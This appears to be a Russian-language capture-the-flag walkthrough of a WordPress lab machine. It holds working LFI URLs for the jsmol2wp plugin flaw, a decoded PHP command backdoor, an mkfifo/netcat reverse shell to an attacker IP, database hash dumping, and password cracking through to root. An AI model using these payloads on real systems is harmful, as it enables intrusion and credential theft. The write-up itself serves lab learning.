
![](../attachment/Pasted%20image%2020250225231859.png)
для доступа к сайту добавим target ip и domain в /etc/hosts

Изучив сайт мы видим что это wordpress и запускаем wpscan

![](../attachment/Pasted%20image%2020250225232047.png)

Из интересного видим jsmol2wp и находим CVE-2018-20463, которое дает нам LFI 
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

![](../attachment/Pasted%20image%2020250225224202.png)
Находим пароля и логин пользователя, заходим в wp-admin и видим приватный пост 

![](../attachment/Pasted%20image%2020250225232310.png)
Читаем  исходный код с помощью найденной LFI и находим упомянутый backdoor
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php

![](../attachment/Pasted%20image%2020250225232424.png)
1. декодирует строку в base64
2. выполняет код с помощью eval
3. выполняет все что передано в cmd
Если мы расшифруем 

```
 if (isset($_GET["\143\155\x64"])) { system($_GET["\143\x6d\144"]); } 
 
 Расшифруем php
<?   
 if (isset($_GET["cmd"])) { system($_GET["cmd"]); }  ?> 
```

Попробуем rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.21.61.35 6653 >/tmp/f

http://www.smol.thm/wp-admin/?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.21.61.35%206653%20%3E%2Ftmp%2Ff

![](../attachment/Pasted%20image%2020250225230421.png)
python3 -c 'import pty;pty.spawn("/bin/bash");'

Проверим БД
1. подключаем mysql -u wpuser -p'kbLSF2Vop#lw3rjDZ629*Z%G' -D wordpress
2. Проверяем таблицы show tables;
3. Проверяем колонки в таблице show columns wp_users;
4. запрашиваем пользователей и пароли  select user_login, user_pass from wp_users;
admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. |
| wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. |
| think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |
| gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 |
| diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 |
| xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1

Сохраняем пользователей и хеши в отдельный файл и запускаем john
![](../attachment/Pasted%20image%2020250225233048.png)

подключение по ssh не удалось, но можем подключиться из существующего шелла.
Получаем первый флаг пользователя
![](../attachment/Pasted%20image%2020250225233246.png)
![](../attachment/Pasted%20image%2020250225233327.png)

diego принадлежит группе internal
![](../attachment/Pasted%20image%2020250225233539.png)
Исследуя папки пользователей находим .ssh у пользователя think, где хранится закрытый ключ

![](../attachment/Pasted%20image%2020250225233626.png)
С помощью ключа подключаемся к пользователю think

![](../attachment/Pasted%20image%2020250225233717.png)
![](../attachment/Pasted%20image%2020250225233731.png)

Исследуя пользователя, находим что он может зайти под gege не используя пароль

![](../attachment/Pasted%20image%2020250225233854.png)
![](../attachment/Pasted%20image%2020250225233911.png)

В папке пользователя находим запароленную старую версию wordpress

![](../attachment/Pasted%20image%2020250225234609.png)

Скачаем архив к себе. 
1. Запустим сервер gege@smol:~$ python3 -m http.server 8080
2. wget http://www.smol.thm:8080/wordpress.old.zip
Получим хеш и расшифруем его 
zip2john wordpress.old.zip > arch_hash.txt
![](../attachment/Pasted%20image%2020250225234758.png)

hashcat -a 0 -m 17225  arch_hash.txt /usr/share/wordlists/rockyou.txt

![](../attachment/Pasted%20image%2020250225235126.png)

Получив пароль и разархивировав старую версию, проверим файл wp-config и получим пароль пользователя xavi

![](../attachment/Pasted%20image%2020250225235228.png)
![](../attachment/Pasted%20image%2020250225235302.png)

пользователь xavi может использовать sudo без пароля
![](../attachment/Pasted%20image%2020250225235745.png)

забираем root флаг

![[../attachment/Pasted image 20250225235847.png]]

